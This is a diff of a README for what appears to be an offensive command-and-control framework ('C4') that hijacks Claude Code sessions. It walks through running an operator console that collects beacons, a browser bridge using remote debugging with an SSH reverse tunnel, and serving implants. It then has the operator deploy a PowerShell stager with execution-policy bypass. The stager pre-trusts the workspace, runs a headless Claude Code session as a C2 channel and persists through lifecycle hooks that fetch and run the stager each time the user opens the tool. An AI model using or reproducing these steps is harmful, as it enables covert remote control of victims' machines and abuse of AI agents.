@@ -156,39 +156,75 @@ The browser bridge needs to control a browser with an authenticated Claude sessi
 **Chrome (macOS):**
 ```bash
 # Quit all Chrome instances first, then:
-/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --remote-debugging-port=9222
+/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
+  --remote-debugging-port=9222 \
+  --user-data-dir=/tmp/chrome-debug
 ```
 
 **Chrome (Windows):**
 ```powershell
 # Close all Chrome windows first, then:
-& "C:\Program Files\Google\Chrome\Application\chrome.exe" --remote-debugging-port=9222
+& "C:\Program Files\Google\Chrome\Application\chrome.exe" `
+  --remote-debugging-port=9222 `
+  --user-data-dir="$env:TEMP\chrome-debug"
 ```
 
 **Firefox (macOS):**
 ```bash
-/Applications/Firefox.app/Contents/MacOS/firefox --remote-debugging-port=9222
+/Applications/Firefox.app/Contents/MacOS/firefox \
+  --remote-debugging-port=9222 \
+  --profile /tmp/firefox-debug
 ```
 
 Log into Claude (claude.ai) in that browser window before proceeding.
 
-### 3. Start the operator console
+### 3. Start the browser bridge
+
+The browser bridge connects to the remote-debugging browser and exposes a WebSocket API for the operator console:
 
 ```bash
-python operator/c4_server.py --port 9050 --tcp-port 9090
+python operator/browser_bridge_local.py --connect-existing --cdp-url http://localhost:9222
 ```
 
-The console listens for beacon check-ins on HTTP (`:9050`) and TCP (`:9090`). When a stager beacons in with a bridge URL, use `interact <name>` to open a browser session and start issuing commands.
+This connects to the Chrome/Firefox instance started in step 2. The bridge listens on `ws://localhost:8888` by default.
+
+**Options:**
+
+| Flag | Description |
+|------|-------------|
+| `--connect-existing` | Connect to an existing browser with remote debugging |
+| `--cdp-url <url>` | CDP endpoint (default: `http://localhost:9222`) |
+| `--ws-port <port>` | WebSocket listen port (default: `8888`) |
+| `--chrome-profile <path>` | Use persistent Chrome profile instead of `--connect-existing` |
+
+**Remote C4 server setup:**
+
+If the C4 server runs on a remote VM while the browser runs locally, set up an SSH reverse tunnel to forward the bridge port:
+
+```bash
+# From your local machine (where browser bridge runs):
+ssh -R 8888:localhost:8888 user@<c4-server-ip>
+```
+
+This forwards the VM's `localhost:8888` back to your local bridge. The C4 server's `--bridge-url ws://localhost:8888` will then connect through the tunnel.
+
+### 4. Start the operator console
+
+```bash
+python operator/c4_server.py --port 9050 --tcp-port 9090 --bridge-url ws://localhost:8888
+```
+
+The console listens for beacon check-ins on HTTP (`:9050`) and TCP (`:9090`), and connects to the browser bridge for sending commands. When a stager beacons in with a bridge URL, use `interact <name>` to open a browser session and start issuing commands.
 
 To also serve stager files over HTTP, pass `--serve-dir` pointing at the `implants/` directory:
 
 ```bash
-python operator/c4_server.py --port 9050 --tcp-port 9090 --serve-dir implants/
+python operator/c4_server.py --port 9050 --tcp-port 9090 --bridge-url ws://localhost:8888 --serve-dir implants/
 ```
 
 Files are accessible at `GET /serve/<implant-id>/<filename>` (e.g. `/serve/abc123/rc_stager_full.ps1`). A listing of all implants and their files is available at `GET /serve`.
 
-### 4. Deploy the stager
+### 5. Deploy the stager
 
 Copy `implants/<implant-id>/rc_stager_full.ps1` to the target. It contains everything needed — the implant, PshAgent, and MCP server — all loaded in-memory.
 
@@ -216,7 +252,7 @@ powershell -ExecutionPolicy Bypass -File rc_stager_full.ps1 -C2 <c2-ip>:9090
 
 The stager pre-trusts the workspace, launches a Claude Code remote-control session, and beacons the bridge URL back to the operator's TCP listener.
 
-### 5. Hook-Based Persistence
+### 6. Hook-Based Persistence
 
 Claude Code supports lifecycle hooks that execute shell commands at session start/end. The C4 protocol can leverage this for persistence — every time the user opens Claude Code, the hook fetches and runs the stager.
 
@@ -277,7 +313,7 @@ This produces a self-contained `-enc <base64>` command instead of the `IEX(IWR .
 
 The user's Claude Code session is unaffected; the C2 channel runs in a separate headless session.
 
-### 6. View results
+### 7. View results
 
 The operator TUI automatically decrypts `verification_record` fields from audit responses when the implant's private key is available. Decrypted results are displayed inline in the session.
 
